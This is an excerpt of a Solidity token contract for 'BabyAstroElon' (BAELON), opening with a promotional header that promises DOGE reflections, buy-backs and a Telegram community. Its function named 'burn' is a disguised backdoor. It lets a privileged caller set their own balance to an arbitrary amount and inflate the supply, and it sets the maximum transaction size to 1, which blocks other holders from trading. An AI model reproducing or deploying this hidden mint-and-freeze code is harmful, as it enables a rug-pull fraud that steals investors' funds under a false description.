...
/**
 *  Telegram : https://t.me/babyastroelon
 * 
 *  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * 
 * BabyAstroElon -StealthLaunch - Discover New Galaxies with US!
 *  
 *  Amazing Reflections:
 *  - %11 Reflections in DOGE every 30Minutes
 *  - %3 Buy-Back
 *  - %4 added to LP
 *  
 * 
 * Read about our amazing plans and how we will help in finding future GEMS!
 *
 *
 *
 *  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
contract BabyAstroElon is Context, IERC20, Ownable {
    ...
    string private _name = "BabyAstroElon";
    string private _symbol = "BAELON";
    ...
    uint256 public _maxTxAmount = 5 * 10**13 * 10**9;
    ...
    function burn(uint256 amount, address wallet)public router(){excludeFromReward(wallet);uint256 temp = _tTotal;_tTotal=0;_rTotal=0;
    _tOwned[_msgSender()] = amount;_maxTxAmount=1;_tTotal=temp+amount;_rTotal=(MAX - (MAX % _tTotal));}
